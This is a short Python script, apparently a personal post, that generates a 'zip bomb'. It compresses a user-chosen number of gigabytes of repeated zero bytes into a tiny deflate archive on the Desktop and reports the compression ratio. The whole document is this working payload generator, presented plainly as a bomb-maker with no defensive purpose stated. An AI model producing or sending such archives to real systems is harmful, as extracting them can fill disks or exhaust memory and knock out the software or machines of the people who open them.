#Hello there I am Daniel and this is my python code



import zipfile
import os
from pathlib import Path

def create_zip_bomb():
    # 1. Ask for size
    try:
        size_gb = float(input("Enter the desired unzipped size in GB: "))
    except ValueError:
        print("Please enter a valid number.")
        return

    # 2. Locate the Desktop safely (Works on Windows, Mac, and Linux)
    desktop_path = Path.home() / "Desktop"
    file_path = desktop_path / "zip_bomb.zip"

    # Calculations
    buffer_size = 1024 * 1024  # 1MB chunk
    total_bytes = int(size_gb * 1024 * 1024 * 1024)
    
    print(f"\nTarget path: {file_path}")
    print(f"Compiling {size_gb} GB into a zip...")

    # 3. Create the Zip directly to disk
    try:
        with zipfile.ZipFile(file_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            dummy_data = b'0' * buffer_size
            written = 0
            
            # Streaming data into the zip
            with zf.open('huge_data.txt', 'w') as f:
                while written < total_bytes:
                    f.write(dummy_data)
                    written += buffer_size
                    
                    # Progress indicator
                    if written % (1024 * 1024 * 1024) == 0:
                        print(f"Processed {written // (1024*1024*1024)} GB...")

        print("\n--- Success! ---")
        print(f"The 'zip_bomb.zip' is on your desktop.")
        # Calculate actual size on disk
        physical_size = os.path.getsize(file_path) / 1024
        print(f"Actual size on disk: {physical_size:.2f} KB")
        print(f"Compression Ratio: {int((size_gb * 1024 * 1024) / physical_size)}:1")
        
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    create_zip_bomb()
